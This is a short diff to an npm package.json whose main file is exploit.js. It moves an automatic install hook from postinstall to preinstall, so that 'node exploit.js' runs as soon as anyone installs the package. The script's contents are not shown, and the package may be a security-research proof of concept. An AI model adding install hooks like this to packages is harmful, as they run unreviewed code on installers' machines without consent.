@@ -3,8 +3,9 @@
   "main": "exploit.js",
   "dependencies": {},
   "scripts": {
-    "postinstall": "node exploit.js"
-  }
+    "preinstall": "node exploit.js"
+  },
+  "author": "@nvk0x"
 }
 
 
